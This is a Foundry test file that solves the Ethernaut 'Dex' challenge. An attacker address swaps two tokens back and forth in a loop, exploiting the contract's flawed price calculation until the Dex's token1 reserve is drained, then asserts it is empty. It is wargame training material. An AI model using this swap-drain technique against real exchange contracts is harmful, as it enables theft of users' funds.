// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Dex.sol";


contract TestDex is Test {
    Dex dex;
    SwappableToken token1;
    SwappableToken token2;
    address attacker = address(0x51);

    function setUp() external {
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "token1", "t1", 10000 ether);
        token2 = new SwappableToken(address(dex), "token2", "t2", 10000 ether);
        dex.setTokens(address(token1), address(token2));
        deal({token: address(token1), to: address(dex), give: 100 ether});
        deal({token: address(token2), to: address(dex), give: 100 ether});
        deal({token: address(token1), to: attacker, give: 10 ether});
        deal({token: address(token2), to: attacker, give: 10 ether});
    }

    function testExploit() external {
        vm.startPrank(attacker);
        token1.approve(attacker, address(dex), type(uint256).max);
        token2.approve(attacker, address(dex), type(uint256).max);

        while(token1.balanceOf(address(dex)) > 0) {
            dex.swap(address(token1), address(token2), token1.balanceOf(attacker));
            uint256 attackerToken2Balance = token2.balanceOf(attacker);
            uint256 dexToken2Balance = token2.balanceOf(address(dex));
            // TODO: this logic works for this case. Make it better to work for every balance
            uint256 amount = attackerToken2Balance > dexToken2Balance ? dexToken2Balance : attackerToken2Balance;
            dex.swap(address(token2), address(token1), amount);
        }

        assertEq(token1.balanceOf(address(dex)), 0);
        vm.stopPrank();
    }
}
